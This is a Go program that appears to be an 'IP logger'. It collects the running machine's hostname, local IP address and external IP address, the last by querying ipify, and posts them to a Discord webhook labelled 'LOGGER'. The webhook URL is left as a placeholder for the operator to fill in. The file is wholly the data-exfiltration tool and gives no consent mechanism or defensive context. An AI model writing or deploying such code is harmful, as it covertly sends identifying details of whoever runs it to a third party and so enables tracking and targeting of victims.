package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"time"
)

type Embed struct {
	Title       string `json:"title"`
	Description string `json:"description"`
	Color       int    `json:"color"`
}

type Webhook struct {
	Content   string  `json:"content"`
	Username  string  `json:"username"`
	AvatarURL string  `json:"avatar_url"`
	Embeds    []Embed `json:"embeds"`
}

func getIPAndHostname() (string, string, string) {
	hostname, _ := os.Hostname()
	addrs, _ := net.InterfaceAddrs()
	var externalIP string

	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				externalIP = getExternalIP()
				return ipnet.IP.String(), externalIP, hostname
			}
		}
	}
	return "", "", hostname
}

func getExternalIP() string {
	resp, err := http.Get("https://api64.ipify.org?format=json")
	if err != nil {
		fmt.Println("error")
		return ""
	}
	defer resp.Body.Close()

	var result map[string]interface{}
	err = json.NewDecoder(resp.Body).Decode(&result)
	if err != nil {
		fmt.Println("error")
		return ""
	}

	return result["ip"].(string)
}

func sendToDiscord(ip, externalIP, hostname string) {
	webhookURL := "YOUR WEBHOOK URL"

	embed := Embed{
		Title:       "LOGGED INFORMATIONS",
		Description: fmt.Sprintf("IP: %s\nExternal IP: %s\nHostname: %s", ip, externalIP, hostname),
		Color:       16776960,
	}

	webhook := Webhook{
		Content:   "",
		Username:  "LOGGER",
		AvatarURL: "",
		Embeds:    []Embed{embed},
	}

	payload, _ := json.Marshal(webhook)

	req, err := http.NewRequest(http.MethodPost, webhookURL, bytes.NewBuffer(payload))
	if err != nil {
		fmt.Println("error")
		return
	}

	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("error")
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent {
		fmt.Println("error")
	}
}

func main() {
	ip, externalIP, hostname := getIPAndHostname()

	sendToDiscord(ip, externalIP, hostname)
}
